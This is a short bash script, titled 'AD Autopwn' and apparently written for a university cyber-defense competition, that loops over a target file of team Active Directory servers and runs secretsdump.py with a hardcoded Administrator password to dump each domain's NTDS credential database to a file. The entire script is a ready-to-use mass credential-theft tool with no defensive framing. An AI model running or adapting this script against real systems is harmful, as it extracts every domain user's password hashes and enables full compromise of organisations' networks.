#!/bin/bash

#AD Autopwn

# Define the username and password
USERNAME="Administrator"
PASSWORD="cdc"

# File containing the AD server targets
TARGET_FILE="ad-targets.txt"

# Loop through each line in the target file
while IFS=',' read -r team_number target; do
  # Extract the team number and the IP:Port
  IP_PORT=$target
  
  # Construct the domain and host names
  DOMAIN="team$team_number.isucdc.com"
  HOST="ad.team$team_number.isucdc.com"
  
  # Output file named after the team number
  OUTPUT_FILE="team$team_number-secretsdump.txt"
  
  # Print out the current operation for logging
  echo "Attempting to dump NTDS from $DOMAIN at $IP_PORT, saving to $OUTPUT_FILE"
  
  # Run secretsdump.py to dump the domain NTDS and save output to a file
  secretsdump.py "$USERNAME:$PASSWORD@$IP_PORT" -just-dc -dc-ip "$IP_PORT" -target-domain "$DOMAIN" > "$OUTPUT_FILE" 2>&1
  
  # Check if the command was successful
  if [ $? -eq 0 ]; then
    echo "NTDS dump successful for $DOMAIN ($IP_PORT), saved to $OUTPUT_FILE"
  else
    echo "Failed to dump NTDS for $DOMAIN ($IP_PORT), check $OUTPUT_FILE for details"
  fi
  
done < "$TARGET_FILE"
